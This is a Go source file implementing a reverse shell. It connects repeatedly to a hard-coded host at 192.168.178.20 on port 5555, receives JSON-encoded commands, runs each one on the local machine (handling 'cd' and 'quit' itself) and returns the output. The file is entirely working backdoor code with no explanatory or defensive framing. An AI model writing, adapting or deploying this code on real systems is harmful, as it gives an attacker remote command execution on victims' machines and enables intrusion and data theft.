package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

func recv(conn net.Conn) string {
    
    data := "" 
    buffer := make([]byte, 2048)
    
    for {

        _, err := conn.Read(buffer)        

        if err != nil || conn == nil {
            conn = connect()
        }else {

            data = strings.Trim(string(buffer), " ")

            json.Unmarshal([]byte(data), &data)

            return strings.Trim(data, string('"'))
        }

    }


}
func send(data string, conn net.Conn) {
    
    json, _:= json.Marshal(data)

    conn.Write([]byte(json))

}
func handleConnection(conn net.Conn) {
    
    for {
        command := strings.ReplaceAll(recv(conn), string('"'), "")
        command = strings.ReplaceAll(command, "\x00", "")
        
        strings.Trim(command, " ")

        str := strings.Split(command, " ")
        var err error 
        var output string
        if str[0] == "quit" {
            return 
        }
        if str[0] == "cd" {
            err = os.Chdir(str[1]) 
            output = "[+] Changed Directory"
        } else {
            cmd := exec.Command(str[0], str[1:]...)
            t, terr := cmd.Output()
            output = string(t)
            err = terr
        }

        if err != nil {
            send(fmt.Sprint(err), conn)
        } else {
            send(string(output), conn)
        }

    }
    
}

func connect() net.Conn {
    var conn net.Conn
    var err error


    for conn == nil {
        conn, err = net.DialTimeout("tcp", "192.168.178.20:5555", time.Second*5)

        if err != nil {
            time.Sleep(time.Second * 2)
        }
    }
 
    return conn
}
func main() {
    conn := connect()
    defer conn.Close()

    handleConnection(conn)
}
